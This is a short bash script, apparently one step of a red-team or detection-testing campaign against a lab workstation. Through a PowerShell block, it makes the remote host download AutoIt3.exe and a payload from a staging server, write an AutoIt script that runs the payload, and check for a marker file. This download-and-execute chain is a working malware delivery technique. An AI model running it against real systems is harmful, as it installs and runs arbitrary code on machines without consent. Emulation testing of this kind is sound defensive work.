#!/usr/bin/env bash
# H-05 AutoIt3 — delivery + execute on ws01
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/h-common.sh"
echo "=== H-05 AutoIt3 ==="
h_require_artifact "AutoIt3.exe"
h_require_artifact "payload.exe"
# optional au3 script name variants
AU3="H-05-payload.au3"
if [[ ! -f "${H_WWW}/${AU3}" ]]; then
  AU3="payload.au3"
fi
if [[ -f "${H_WWW}/${AU3}" ]]; then
  h_require_artifact "${AU3}"
fi
h_ws01_exec "
\$ErrorActionPreference='Continue'
\$server='${H_WS01_HTTP}'
\$marker='C:\Windows\Temp\H-PAYLOAD-MARKER.txt'
Remove-Item \$marker -Force -ErrorAction SilentlyContinue
\$dir='C:\Windows\Temp\campaign-h'
New-Item -ItemType Directory -Force -Path \$dir | Out-Null
(New-Object Net.WebClient).DownloadFile(\"\$server/AutoIt3.exe\", \"\$dir\AutoIt3.exe\")
(New-Object Net.WebClient).DownloadFile(\"\$server/payload.exe\", \"\$dir\payload.exe\")
\$au3=@'
Run(@ScriptDir & \"\\payload.exe\")
'@
Set-Content -Path \"\$dir\H-05.au3\" -Value \$au3 -Encoding ASCII
Start-Process -FilePath \"\$dir\AutoIt3.exe\" -ArgumentList \"\$dir\H-05.au3\" -Wait -ErrorAction SilentlyContinue
Start-Sleep -Seconds 6
if (Test-Path \$marker) { Write-Output 'H05_MARKER True'; Get-Content \$marker; Remove-Item \$marker -Force } else { Write-Output 'H05_MARKER False' }
Write-Output 'H05_DONE'
"
echo "H-05 complete"
